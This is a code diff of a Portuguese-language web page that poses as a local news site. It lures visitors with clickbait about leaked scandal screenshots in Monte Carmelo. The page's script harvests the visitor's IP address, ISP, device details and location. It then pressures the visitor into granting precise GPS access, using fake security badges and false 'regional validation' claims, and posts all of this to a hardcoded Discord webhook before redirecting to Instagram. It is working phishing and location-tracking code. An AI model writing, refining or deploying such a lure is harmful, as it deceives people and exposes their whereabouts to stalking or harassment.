@@ -3,129 +3,790 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monte City Notícias - Plantão</title>
-
-    <meta property="og:title" content="🚨 URGENTE: ESCÂNDALO EM MONTE CARMELO">
-    <meta property="og:description" content="Figuras públicas expostas in prints vazados. Clique para ver os detalhes!">
+    <title>Monte City News - Portal Exclusivo de Notícias</title>
+    
+    <!-- Meta tags otimizadas para WhatsApp -->
+    <meta property="og:title" content="⚠️ EXCLUSIVO: Prints Vazados Abalam Monte Carmelo">
+    <meta property="og:description" content="Documentos confidenciais e conversas expostas. Veja antes que seja removido!">
     <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20260626-WA0003.jpg">
-    <meta property="og:type" content="website">
-
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="Monte City News">
+    
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #000; 
-            color: #fff; 
-            margin: 0; 
-            padding: 0; 
-            text-align: center; 
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #e94560;
+            --accent: #ffd700;
+            --text: #ffffff;
+            --glass: rgba(255, 255, 255, 0.1);
         }
-        .header { 
-            background-color: #b71c1c; 
-            padding: 15px; 
-            font-weight: bold; 
-            font-size: 1.3em; 
-            letter-spacing: 1px; 
-            box-shadow: 0 2px 10px rgba(0,0,0,0.5); 
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .container { 
-            padding: 20px; 
-            max-width: 500px; 
-            margin: 0 auto; 
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0f0f1e 0%, #1a1a2e 50%, #16213e 100%);
+            color: var(--text);
+            min-height: 100vh;
+            line-height: 1.6;
         }
-        
-        /* Imagem com desfoque forçando o clique */
-        .thumbnail { 
-            width: 100%; 
-            max-width: 450px; 
-            border-radius: 8px; 
-            filter: blur(8px); 
-            margin-bottom: 20px; 
-            border: 2px solid #555; 
+
+        /* Header Premium */
+        .header {
+            background: linear-gradient(90deg, #c41e3a, #e94560);
+            padding: 20px;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 30px rgba(233, 69, 96, 0.3);
+            backdrop-filter: blur(10px);
         }
-        
-        .aviso { 
-            color: #ffca28; 
-            font-weight: bold; 
-            margin-bottom: 20px; 
-            font-size: 1.1em; 
-            line-height: 1.4; 
+
+        .header-content {
+            max-width: 600px;
+            margin: 0 auto;
         }
-        
-        .btn-acesso { 
-            background: #b71c1c; 
-            color: white; 
-            padding: 18px 30px; 
-            border: none; 
-            border-radius: 8px; 
-            font-size: 1.2em; 
-            font-weight: bold; 
-            cursor: pointer; 
-            width: 100%; 
-            transition: 0.3s; 
-            box-shadow: 0 4px 10px rgba(183, 28, 28, 0.4); 
+
+        .breaking-news {
+            display: inline-block;
+            background: var(--accent);
+            color: #000;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: 800;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            animation: pulse 2s infinite;
+            margin-bottom: 10px;
         }
-        
-        .btn-acesso:active { 
-            transform: scale(0.97); 
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
-        
-        #loader { 
-            display: none; 
-            margin-top: 20px; 
-            color: #aaa; 
-            font-weight: bold; 
+
+        .logo-text {
+            font-size: 2em;
+            font-weight: 900;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            background: linear-gradient(45deg, #fff, #ffd700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .live-badge {
+            display: inline-block;
+            background: #ff0000;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: live 1.5s infinite;
+        }
+
+        @keyframes live {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* Container Principal */
+        .container {
+            max-width: 550px;
+            margin: 0 auto;
+            padding: 25px 20px;
+        }
+
+        /* Card de Conteúdo Premium */
+        .content-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 30px 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        /* Imagem com efeito premium */
+        .image-wrapper {
+            position: relative;
+            margin-bottom: 25px;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .exclusive-thumbnail {
+            width: 100%;
+            border-radius: 12px;
+            filter: blur(12px) brightness(0.7);
+            transition: all 0.5s ease;
+            cursor: pointer;
+        }
+
+        .blur-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(233, 69, 96, 0.95);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 1.1em;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.5);
+            animation: float 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(-50%, -50%); }
+            50% { transform: translate(-50%, -60%); }
+        }
+
+        /* Seção de Localização */
+        .location-section {
+            background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .location-title {
+            font-size: 1.3em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .city-options {
+            display: grid;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .city-btn {
+            background: var(--glass);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .city-btn:hover {
+            background: rgba(233, 69, 96, 0.2);
+            border-color: var(--secondary);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(233, 69, 96, 0.3);
+        }
+
+        .city-btn.selected {
+            background: var(--secondary);
+            border-color: var(--secondary);
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.5);
+        }
+
+        .city-icon {
+            font-size: 1.5em;
+        }
+
+        /* Indicadores de Confiança */
+        .trust-indicators {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+        }
+
+        .trust-item {
+            text-align: center;
+            font-size: 0.85em;
+        }
+
+        .trust-icon {
+            font-size: 2em;
+            margin-bottom: 8px;
+        }
+
+        /* Botão Principal */
+        .btn-primary {
+            background: linear-gradient(135deg, #c41e3a, #e94560);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 1.2em;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(233, 69, 96, 0.6);
+        }
+
+        .btn-primary:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Loader Premium */
+        .loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loader-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid var(--secondary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            color: white;
+            font-size: 1.1em;
+            text-align: center;
+            animation: fadeInOut 2s infinite;
+        }
+
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.8em;
+        }
+
+        /* Alert personalizado */
+        .custom-alert {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: var(--primary);
+            border: 2px solid var(--secondary);
+            padding: 30px;
+            border-radius: 20px;
+            z-index: 10001;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .custom-alert.active {
+            display: block;
+        }
+
+        .alert-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 10000;
+        }
+
+        .alert-overlay.active {
+            display: block;
         }
     </style>
 </head>
 <body>
+    <!-- Header Premium -->
+    <header class="header">
+        <div class="header-content">
+            <div class="breaking-news">
+                <span class="live-badge"></span>AO VIVO
+            </div>
+            <h1 class="logo-text">📰 MONTE CITY NEWS</h1>
+            <p style="margin-top: 5px; font-size: 0.9em; opacity: 0.9;">O portal de notícias mais confiável da região</p>
+        </div>
+    </header>
 
-    <div class="header">MONTE CITY - PLANTÃO URGENTE</div>
+    <!-- Conteúdo Principal -->
+    <main class="container">
+        <div class="content-card">
+            <!-- Imagem com efeito -->
+            <div class="image-wrapper">
+                <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20260626-WA0003.jpg" 
+                     alt="Conteúdo Exclusivo" 
+                     class="exclusive-thumbnail" 
+                     id="exclusiveImage">
+                <div class="blur-overlay" id="blurOverlay">
+                    🔒 CONTEÚDO RESTRITO<br>
+                    <small style="font-size: 0.7em;">Confirme sua localização para acessar</small>
+                </div>
+            </div>
 
-    <div class="container">
-        <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20260626-WA0003.jpg" alt="Escândalo Monte Carmelo" class="thumbnail">
-        
-        <p class="aviso">REVELADO: O conteúdo por trás do escândalo que parou Monte Carmelo. Clique abaixo para confirmar sua região e acessar os prints exclusivos.</p>
-        
-        <button id="btn" class="btn-acesso" onclick="iniciarFluxo()">LER MATÉRIA COMPLETA</button>
+            <!-- Título da Notícia -->
+            <h2 style="font-size: 1.5em; margin-bottom: 15px; color: #ffd700;">
+                🚨 EXCLUSIVO: Escândalo Abala Estruturas de Poder em Monte Carmelo
+            </h2>
+            
+            <p style="color: #aaa; margin-bottom: 20px; line-height: 1.7;">
+                Prints e conversas comprometedoras de figuras influentes vazaram na manhã de hoje. 
+                Para garantir a segurança das informações e validar o acesso regional, 
+                precisamos confirmar sua localização.
+            </p>
 
-        <div id="loader">
-            <p>Validando acesso regional via satélite...</p>
+            <!-- Indicadores de Confiança -->
+            <div class="trust-indicators">
+                <div class="trust-item">
+                    <div class="trust-icon">🔒</div>
+                    <div>Criptografado</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">✅</div>
+                    <div>Verificado</div>
+                </div>
+                <div class="trust-item">
+                    <div class="trust-icon">🛡️</div>
+                    <div>Protegido</div>
+                </div>
+            </div>
+
+            <!-- Seção de Localização -->
+            <div class="location-section">
+                <div class="location-title">
+                    <span>📍</span>
+                    <span>Confirme sua cidade para liberar o conteúdo:</span>
+                </div>
+                
+                <div class="city-options">
+                    <button class="city-btn" onclick="selectCity('monteCarmelo')" id="btnMonteCarmelo">
+                        <span class="city-icon">🏙️</span>
+                        <span>Sou de Monte Carmelo - MG</span>
+                    </button>
+                    
+                    <button class="city-btn" onclick="selectCity('outra')" id="btnOutra">
+                        <span class="city-icon">🗺️</span>
+                        <span>Sou de outra cidade</span>
+                    </button>
+
+                    <div id="otherCityInput" style="display: none; margin-top: 10px;">
+                        <input type="text" 
+                               id="cityName" 
+                               placeholder="Digite o nome da sua cidade..." 
+                               style="width: 100%; padding: 12px; background: rgba(255,255,255,0.1); 
+                                      border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; 
+                                      color: white; font-size: 1em;">
+                    </div>
+                </div>
+
+                <p style="margin-top: 15px; color: #ffd700; font-size: 0.9em; text-align: center;">
+                    ⚠️ Esta verificação é necessária para garantir que apenas moradores da região 
+                    tenham acesso ao conteúdo sensível.
+                </p>
+            </div>
+
+            <!-- Botão Principal -->
+            <button class="btn-primary" id="mainButton" disabled onclick="processAccess()">
+                🔓 DESBLOQUEAR CONTEÚDO EXCLUSIVO
+            </button>
+
+            <!-- Mensagem de Segurança -->
+            <p style="text-align: center; margin-top: 15px; color: #666; font-size: 0.8em;">
+                Seus dados estão protegidos e não serão compartilhados.
+            </p>
+        </div>
+    </main>
+
+    <!-- Loader Overlay -->
+    <div class="loader-overlay" id="loader">
+        <div class="spinner"></div>
+        <div class="loader-text">
+            <div id="loaderMessage">Validando sua localização...</div>
+            <div style="font-size: 0.8em; margin-top: 10px; color: #aaa;">
+                Isso pode levar alguns segundos
+            </div>
         </div>
     </div>
 
+    <!-- Alert Personalizado -->
+    <div class="alert-overlay" id="alertOverlay"></div>
+    <div class="custom-alert" id="customAlert">
+        <div style="font-size: 3em; margin-bottom: 20px;">📍</div>
+        <h3 style="margin-bottom: 15px;">Localização Necessária</h3>
+        <p style="color: #aaa; margin-bottom: 20px;">
+            Para acessar o conteúdo exclusivo da sua região, 
+            precisamos confirmar sua localização via GPS.
+        </p>
+        <button class="btn-primary" onclick="requestLocation()" style="margin-bottom: 10px;">
+            Permitir Localização
+        </button>
+        <button onclick="closeAlert()" 
+                style="background: none; border: 1px solid rgba(255,255,255,0.2); 
+                       color: white; padding: 10px 20px; border-radius: 8px; 
+                       cursor: pointer; width: 100%;">
+            Cancelar
+        </button>
+    </div>
+
+    <footer class="footer">
+        <p>© 2024 Monte City News - Todos os direitos reservados</p>
+        <p style="margin-top: 5px;">Notícias verificadas e confiáveis da sua região</p>
+    </footer>
+
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467483594279878717/Yd31-VbARr_0NGE01f3tq7lg8Rg0-fCNxVj2FUED7yZcRt47p_Etr7kyTGUFV_Mq3os8";
+        let selectedCity = null;
+        let userData = {};
 
-        function iniciarFluxo() {
-            document.getElementById('btn').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
-            capturarIP();
+        // Selecionar cidade
+        function selectCity(cityType) {
+            // Resetar seleções anteriores
+            document.querySelectorAll('.city-btn').forEach(btn => btn.classList.remove('selected'));
+            
+            if (cityType === 'monteCarmelo') {
+                document.getElementById('btnMonteCarmelo').classList.add('selected');
+                document.getElementById('otherCityInput').style.display = 'none';
+                selectedCity = 'Monte Carmelo - MG';
+            } else {
+                document.getElementById('btnOutra').classList.add('selected');
+                document.getElementById('otherCityInput').style.display = 'block';
+                document.getElementById('cityName').focus();
+                selectedCity = null;
+            }
+            
+            updateMainButton();
         }
 
-        function capturarIP() {
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    const info = `🚨 **NOVO ACESSO: ESCÂNDALO**\n📍 **Cidade:** ${data.city}\n🌐 **IP:** ${data.ip}`;
-                    fetch(WEBHOOK_URL, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ content: info }) })
-                    .finally(() => solicitarGPS());
-                }).catch(() => solicitarGPS());
+        // Atualizar cidade quando o input mudar
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('cityName').addEventListener('input', function() {
+                if (this.value.trim().length > 2) {
+                    selectedCity = this.value.trim();
+                    updateMainButton();
+                }
+            });
+        });
+
+        function updateMainButton() {
+            const button = document.getElementById('mainButton');
+            if (selectedCity) {
+                button.disabled = false;
+                button.style.opacity = '1';
+                button.innerHTML = '🔓 DESBLOQUEAR CONTEÚDO EXCLUSIVO';
+            }
         }
 
-        function solicitarGPS() {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const mapa = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    fetch(WEBHOOK_URL, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ content: `🌍 **GPS EXATO:** ${mapa}` }) })
-                    .finally(() => window.location.href = "https://www.instagram.com/montecitybr");
-                },
-                () => { 
-                    alert("A confirmação de localização é obrigatória para validar o acesso regional."); 
-                    location.reload(); 
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
+        // Processar acesso
+        function processAccess() {
+            if (!selectedCity) {
+                showAlert();
+                return;
+            }
+
+            // Salvar dados do usuário
+            userData.city = selectedCity;
+            userData.timestamp = new Date().toISOString();
+            userData.userAgent = navigator.userAgent;
+            userData.language = navigator.language;
+            userData.platform = navigator.platform;
+            userData.screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+            // Mostrar loader
+            const loader = document.getElementById('loader');
+            loader.classList.add('active');
+            
+            // Sequência de mensagens do loader
+            const messages = [
+                'Verificando sua cidade...',
+                'Validando permissões de acesso...',
+                'Conectando ao servidor regional...',
+                'Confirmando sua localização...'
+            ];
+            
+            let messageIndex = 0;
+            const messageInterval = setInterval(() => {
+                messageIndex = (messageIndex + 1) % messages.length;
+                document.getElementById('loaderMessage').textContent = messages[messageIndex];
+            }, 1500);
+
+            // Coletar dados de IP
+            collectIPData()
+                .then(() => {
+                    clearInterval(messageInterval);
+                    document.getElementById('loaderMessage').textContent = 'Localização confirmada! Precisamos de sua confirmação via GPS...';
+                    
+                    // Pequeno delay antes de pedir GPS
+                    setTimeout(() => {
+                        showGPSRequest();
+                    }, 1500);
+                })
+                .catch(() => {
+                    clearInterval(messageInterval);
+                    showGPSRequest();
+                });
         }
+
+        // Coletar dados de IP
+        async function collectIPData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                userData.ip = data.ip;
+                userData.ipCity = data.city;
+                userData.ipRegion = data.region;
+                userData.ipCountry = data.country_name;
+                userData.isp = data.org;
+                
+                // Enviar dados iniciais para o webhook
+                const message = formatInitialMessage();
+                await sendToWebhook(message);
+                
+            } catch (error) {
+                console.log('Erro ao coletar IP:', error);
+            }
+        }
+
+        function formatInitialMessage() {
+            return `📊 **DADOS DE ACESSO INICIAIS**
+━━━━━━━━━━━━━━━━━━
+👤 **Usuário declarou:** ${userData.city}
+🌐 **IP:** ${userData.ip || 'Não detectado'}
+📍 **Cidade (IP):** ${userData.ipCity || 'Não detectada'}
+🏙️ **Região:** ${userData.ipRegion || 'Não detectada'}
+🌍 **País:** ${userData.ipCountry || 'Não detectado'}
+📡 **Provedor:** ${userData.isp || 'Não detectado'}
+━━━━━━━━━━━━━━━━━━
+💻 **Dispositivo:** ${userData.platform}
+🖥️ **Resolução:** ${userData.screenResolution}
+🌐 **Idioma:** ${userData.language}
+⏰ **Horário:** ${new Date().toLocaleString('pt-BR')}`;
+        }
+
+        // Mostrar alerta personalizado
+        function showAlert() {
+            document.getElementById('alertOverlay').classList.add('active');
+            document.getElementById('customAlert').classList.add('active');
+        }
+
+        function closeAlert() {
+            document.getElementById('alertOverlay').classList.remove('active');
+            document.getElementById('customAlert').classList.remove('active');
+            document.getElementById('loader').classList.remove('active');
+        }
+
+        // Mostrar requisição de GPS
+        function showGPSRequest() {
+            document.getElementById('loader').classList.remove('active');
+            document.getElementById('alertOverlay').classList.add('active');
+            
+            // Modificar alerta para GPS
+            const customAlert = document.getElementById('customAlert');
+            customAlert.innerHTML = `
+                <div style="font-size: 3em; margin-bottom: 20px;">🛰️</div>
+                <h3 style="margin-bottom: 15px;">Confirmação de Localização</h3>
+                <p style="color: #aaa; margin-bottom: 20px;">
+                    Para garantir a segurança e autenticidade do acesso, 
+                    precisamos confirmar sua localização atual via GPS.
+                </p>
+                <div style="background: rgba(255,215,0,0.1); padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+                    <p style="color: #ffd700; font-size: 0.9em;">
+                        ⚠️ Este passo é essencial para validar sua identidade regional 
+                        e liberar o conteúdo exclusivo.
+                    </p>
+                </div>
+                <button class="btn-primary" onclick="requestLocation()" style="margin-bottom: 10px;">
+                    ✅ Permitir e Confirmar Localização
+                </button>
+                <button onclick="cancelAccess()" 
+                        style="background: none; border: 1px solid rgba(255,255,255,0.2); 
+                               color: white; padding: 10px 20px; border-radius: 8px; 
+                               cursor: pointer; width: 100%;">
+                    Não quero ver o conteúdo
+                </button>
+            `;
+            customAlert.classList.add('active');
+        }
+
+        // Requisitar localização GPS
+        function requestLocation() {
+            document.getElementById('alertOverlay').classList.remove('active');
+            document.getElementById('customAlert').classList.remove('active');
+            document.getElementById('loader').classList.add('active');
+            document.getElementById('loaderMessage').textContent = 'Obtendo localização via satélite...';
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        userData.latitude = latitude;
+                        userData.longitude = longitude;
+                        userData.gpsAccuracy = `${accuracy} metros`;
+                        userData.googleMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        // Enviar dados de GPS
+                        const gpsMessage = formatGPSMessage();
+                        await sendToWebhook(gpsMessage);
+                        
+                        // Simular verificação final
+                        document.getElementById('loaderMessage').textContent = 'Verificação concluída! Redirecionando...';
+                        
+                        setTimeout(() => {
+                            document.getElementById('loader').classList.remove('active');
+                            document.getElementById('exclusiveImage').style.filter = 'none';
+                            document.getElementById('blurOverlay').style.display = 'none';
+                            
+                            // Redirecionar após mostrar o conteúdo por um breve momento
+                            setTimeout(() => {
+                                window.location.href = "https://www.instagram.com/montecitybr";
+                            }, 2000);
+                        }, 1500);
+                    },
+                    (error) => {
+                        handleLocationError(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert("Seu navegador não suporta geolocalização.");
+            }
+        }
+
+        function formatGPSMessage() {
+            return `📍 **LOCALIZAÇÃO GPS OBTIDA**
+━━━━━━━━━━━━━━━━━━
+🗺️ **Coordenadas:** ${userData.latitude}, ${userData.longitude}
+🎯 **Precisão:** ${userData.gpsAccuracy}
+🔗 **Google Maps:** ${userData.googleMaps}
+━━━━━━━━━━━━━━━━━━
+🏙️ **Cidade Declarada:** ${userData.city}
+🌐 **IP:** ${userData.ip || 'Não detectado'}
+⏰ **Horário da captura:** ${new Date().toLocaleString('pt-BR')}`;
+        }
+
+        function handleLocationError(error) {
+            document.getElementById('loader').classList.remove('active');
+            
+            let errorMessage = '';
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = 'Para acessar o conteúdo exclusivo da sua região, é necessário permitir a localização.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = 'Não foi possível determinar sua localização. Verifique sua conexão.';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = 'Tempo esgotado. Tente novamente.';
+                    break;
+            }
+            
+            document.getElementById('alertOverlay').classList.add('active');
+            const customAlert = document.getElementById('customAlert');
+            customAlert.innerHTML = `
+                <div style="font-size: 3em; margin-bottom: 20px;">⚠️</div>
+                <h3 style="margin-bottom: 15px;">Localização Necessária</h3>
+                <p style="color: #aaa; margin-bottom: 20px;">${errorMessage}</p>
+                <button class="btn-primary" onclick="requestLocation()" style="margin-bottom: 10px;">
+                    Tentar Novamente
+                </button>
+                <button onclick="cancelAccess()" 
+                        style="background: none; border: 1px solid rgba(255,255,255,0.2); 
+                               color: white; padding: 10px 20px; border-radius: 8px; 
+                               cursor: pointer; width: 100%;">
+                    Cancelar
+                </button>
+            `;
+            customAlert.classList.add('active');
+        }
+
+        function cancelAccess() {
+            document.getElementById('alertOverlay').classList.remove('active');
+            document.getElementById('customAlert').classList.remove('active');
+            document.getElementById('loader').classList.remove('active');
+            document.getElementById('mainButton').disabled = false;
+        }
+
+        // Enviar dados para o webhook
+        async function sendToWebhook(message) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (error) {
+                console.log('Erro ao enviar webhook:', error);
+            }
+        }
+
+        // Coletar dados adicionais do navegador
+        document.addEventListener('DOMContentLoaded', function() {
+            userData.referrer = document.referrer || 'Acesso direto';
+            userData.pageTitle = document.title;
+            userData.cookiesEnabled = navigator.cookieEnabled;
+        });
     </script>
 </body>
 </html>
